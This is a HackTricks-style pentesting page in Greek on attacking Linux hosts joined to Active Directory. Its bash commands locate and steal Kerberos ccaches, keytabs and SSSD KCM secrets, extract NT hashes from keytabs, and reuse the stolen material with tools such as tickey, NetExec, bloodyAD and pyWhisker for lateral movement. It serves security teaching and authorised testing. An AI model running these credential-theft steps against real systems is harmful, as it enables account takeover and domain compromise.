# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Ένα linux machine μπορεί επίσης να βρίσκεται μέσα σε ένα περιβάλλον Active Directory.

Ένα Linux machine μέσα σε ένα AD μπορεί να **αποθηκεύει τοπικά υλικό Kerberos**: user ccaches, machine/service keytabs και secrets που διαχειρίζεται το SSSD. Αυτά τα artefacts μπορούν συνήθως να επαναχρησιμοποιηθούν όπως οποιοδήποτε άλλο Kerberos credential. Για να διαβάσετε τα περισσότερα από αυτά, θα πρέπει να είστε ο user owner του ticket ή **root** στο machine.

## Enumeration

### AD enumeration από linux

Αν έχετε πρόσβαση σε ένα AD από linux (ή σε bash στα Windows), μπορείτε να δοκιμάσετε το [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) για να κάνετε enumeration του AD.

Μπορείτε επίσης να δείτε την ακόλουθη σελίδα για να μάθετε **άλλους τρόπους για enumeration του AD από linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

Το FreeIPA είναι μια open-source **alternative** στο Microsoft Windows **Active Directory**, κυρίως για **Unix** περιβάλλοντα. Συνδυάζει ένα πλήρες **LDAP directory** με ένα MIT **Kerberos** Key Distribution Center για διαχείριση παρόμοια με αυτή του Active Directory. Χρησιμοποιώντας το Dogtag **Certificate System** για τη διαχείριση CA & RA certificates, υποστηρίζει **multi-factor** authentication, συμπεριλαμβανομένων των smartcards. Το SSSD είναι ενσωματωμένο για Unix authentication processes. Μάθετε περισσότερα σχετικά:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefacts από domain-joined host

Πριν ασχοληθείτε με tickets, εντοπίστε **πώς έγινε το join του host στο AD** και **πού αποθηκεύεται πραγματικά το υλικό Kerberos**. Στα σύγχρονα Linux hosts αυτό συνήθως γίνεται με `realmd` + `adcli` + `sssd`, και όχι μόνο με flat files στο `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Αυτό σας ενημερώνει γρήγορα αν το host εμπιστεύεται το AD, αν το SSSD κάνει caching identities ή tickets και αν είναι διαθέσιμα **machine/service keytabs** ή **KCM secrets** για abuse.

## Playing with tickets

### Pass The Ticket

Σε αυτή τη σελίδα θα βρείτε διαφορετικές τοποθεσίες όπου μπορείτε να **βρείτε kerberos tickets μέσα σε ένα linux host**. Στην ακόλουθη σελίδα μπορείτε να μάθετε πώς να μετατρέπετε αυτά τα CCache ticket formats σε Kirbi (το format που χρειάζεστε για χρήση στα Windows), καθώς και πώς να πραγματοποιείτε μια επίθεση PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Αν θέλετε τα **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, κ.λπ.), δείτε την ειδική σελίδα:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Επαναχρησιμοποίηση CCACHE tickets από το /tmp

Τα αρχεία CCACHE είναι binary formats για **αποθήκευση Kerberos credentials**. Το `FILE:/tmp/krb5cc_%{uid}` εξακολουθεί να είναι συνηθισμένο, αλλά τα σύγχρονα Linux deployments χρησιμοποιούν επίσης `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ή `KCM:%{uid}`. Ελέγξτε τη μεταβλητή περιβάλλοντος **`KRB5CCNAME`** και τη ρύθμιση `default_ccache_name` πριν υποθέσετε ότι τα tickets βρίσκονται στο `/tmp`.<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Επαναχρησιμοποίηση CCACHE ticket από keyring

**Τα Kerberos tickets που αποθηκεύονται στη μνήμη μιας διεργασίας μπορούν να εξαχθούν**, ιδιαίτερα όταν η προστασία ptrace του μηχανήματος είναι απενεργοποιημένη (`/proc/sys/kernel/yama/ptrace_scope`). Ένα χρήσιμο tool για αυτόν τον σκοπό βρίσκεται στη διεύθυνση [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), το οποίο διευκολύνει την εξαγωγή μέσω injection σε sessions και την αποθήκευση των tickets στο `/tmp`.

Για τη ρύθμιση και τη χρήση αυτού του tool, ακολουθούν τα παρακάτω βήματα:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Αυτή η διαδικασία θα προσπαθήσει να κάνει inject σε διάφορα sessions, υποδεικνύοντας την επιτυχία με την αποθήκευση των extracted tickets στο `/tmp`, χρησιμοποιώντας τη σύμβαση ονοματοδοσίας `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Επαναχρησιμοποίηση CCACHE ticket από το SSSD KCM

Το SSSD διατηρεί ένα αντίγραφο της database στη διαδρομή `/var/lib/sss/secrets/secrets.ldb`. Το αντίστοιχο key αποθηκεύεται ως hidden file στη διαδρομή `/var/lib/sss/secrets/.secrets.mkey`. Από προεπιλογή, το key είναι αναγνώσιμο μόνο αν διαθέτετε permissions **root**.

Η εκτέλεση του **`SSSDKCMExtractor`** με τις παραμέτρους --database και --key θα κάνει parse τη database και θα **decrypt τα secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Το **Kerberos credential cache blob μπορεί να μετατραπεί σε usable Kerberos CCache** file που μπορεί να περαστεί σε Mimikatz/Rubeus.

### Γρήγορο keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Εξαγωγή λογαριασμών από το /etc/krb5.keytab

Τα κλειδιά λογαριασμών υπηρεσίας, απαραίτητα για υπηρεσίες που εκτελούνται με δικαιώματα root, αποθηκεύονται με ασφάλεια σε αρχεία **`/etc/krb5.keytab`**. Αυτά τα κλειδιά, τα οποία λειτουργούν σαν κωδικοί πρόσβασης για υπηρεσίες, απαιτούν αυστηρή εμπιστευτικότητα.

Για την επιθεώρηση των περιεχομένων του αρχείου keytab, μπορεί να χρησιμοποιηθεί το **`klist`**. Σε Linux, το `klist -k -K -e` εμφανίζει τα principals, τους αριθμούς έκδοσης κλειδιών, τους τύπους κρυπτογράφησης και το ακατέργαστο υλικό των κλειδιών. Αν ο τύπος κλειδιού είναι **23 / RC4-HMAC**, η τιμή του κλειδιού είναι επίσης το **NT hash** του συγκεκριμένου principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Για Linux users, το **`KeyTabExtract`** παρέχει λειτουργικότητα για την εξαγωγή του RC4 HMAC hash, το οποίο μπορεί να αξιοποιηθεί για NTLM hash reuse. Σημειώστε ότι αυτό είναι χρήσιμο μόνο όταν το keytab περιέχει ακόμη υλικό **etype 23 / RC4-HMAC**. Σε περιβάλλοντα **AES-only** ενδέχεται να μην λάβετε reusable NT hash, αλλά μπορείτε να κάνετε απευθείας authenticate με το keytab μέσω Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Στο macOS, το **`bifrost`** λειτουργεί ως εργαλείο ανάλυσης αρχείων keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Χρησιμοποιώντας τις εξαχθείσες πληροφορίες λογαριασμών και hashes, μπορούν να δημιουργηθούν συνδέσεις σε servers με εργαλεία όπως το **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Επαναχρησιμοποίηση του machine account από το `/etc/krb5.keytab`

Σε συστήματα που έχουν γίνει join μέσω `realmd`/`adcli`/`sssd`, το `/etc/krb5.keytab` συνήθως περιέχει το **computer account** και ένα ή περισσότερα **host/service principals**. Αν έχετε **root**, μην κάνετε απλώς dump: χρησιμοποιήστε ένα από τα principals που εμφανίζονται με την εντολή `klist -k` για να ζητήσετε ένα TGT και να λειτουργήσετε ως ο ίδιος ο Linux host.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν το ίδιο το **computer object** έχει delegated δικαιώματα στο AD ή όταν ο host επιτρέπεται να ανακτά άλλα secrets, όπως ένα **gMSA**.

### Επαναχρησιμοποίηση κλεμμένου υλικού Kerberos με Linux-first εργαλεία AD

Μόλις αποκτήσετε ένα έγκυρο `ccache` ή ένα αξιοποιήσιμο keytab, μπορείτε να εκτελείτε ενέργειες στο AD **απευθείας από Linux**, χωρίς να μετατρέψετε πρώτα τα πάντα σε Windows formats. Πολλά σύγχρονα εργαλεία υποστηρίζουν εγγενώς τα `KRB5CCNAME` / Kerberos auth:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Αυτή είναι μια καλή γέφυρα μεταξύ του **Linux post-exploitation** και του **AD object abuse**. Για τις ίδιες τις διαδρομές **object-level abuse**, δείτε:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

Οι πρόσφατες Linux deployments μπορούν να χρησιμοποιούν απευθείας **Managed Service Accounts** από το AD. Στην πράξη, αυτό σημαίνει ότι, μετά το compromise ενός Linux server, μπορεί να βρείτε όχι μόνο το host keytab αλλά και **service-specific keytabs** που έχουν δημιουργηθεί από ένα gMSA. Συνήθη σημεία προς έλεγχο είναι τα `/etc/gmsad.conf`, τα deployment-specific config files και επιπλέον αρχεία `*.keytab` κάτω από το `/etc`.<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Αυτό σας παρέχει μια επαναχρησιμοποιήσιμη ταυτότητα Kerberos για τα SPNs που είναι συνδεδεμένα με το συγκεκριμένο gMSA **χωρίς να αγγίξετε κανένα Windows endpoint**. Για **domain-side** abuse του gMSA/dMSA μετά την απόκτηση υψηλότερων privileges στο AD, δείτε:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Αναφορές

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Accessing AD with a managed service account – Integrating RHEL systems directly with Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
